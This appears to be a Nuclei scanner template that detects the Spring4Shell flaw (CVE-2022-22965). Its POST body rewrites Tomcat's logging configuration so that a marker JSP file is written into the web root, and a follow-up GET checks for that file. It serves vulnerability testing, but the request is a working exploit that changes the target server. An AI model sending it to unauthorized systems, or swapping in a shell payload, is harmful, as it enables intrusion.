id: CVE-2022-22965

info:
  name: CVE-2022-22965 - Spring4Shell RCE Vulnerability
  author: justmumu
  description: CVE-2022-22965 - Spring Core Remote Code Execution Vulnerability
  severity: critical
  tags: cve,rce,spring,cve2022,injection
  classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
     cvss-score: 9.8
     cve-id: CVE-2022-22965
     cwe-id: CWE-770

requests:
  - method: POST
    path:
      - "{{BaseURL}}"
    redirects: false
    headers:
      suffix: "%>"
      c2: "<%"
      Content-Type: application/x-www-form-urlencoded
    body: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out.println(new%20String(%22exploitable%22))%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=checkexploit&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

  - method: GET
    path:
      - "{{RootURL}}/checkexploit.jsp"
    headers:
      01: "{{wait_for(5)}}"

    matchers:
      - type: dsl
        dsl:
          - "status_code==200 && contains(body, 'exploitable')"
 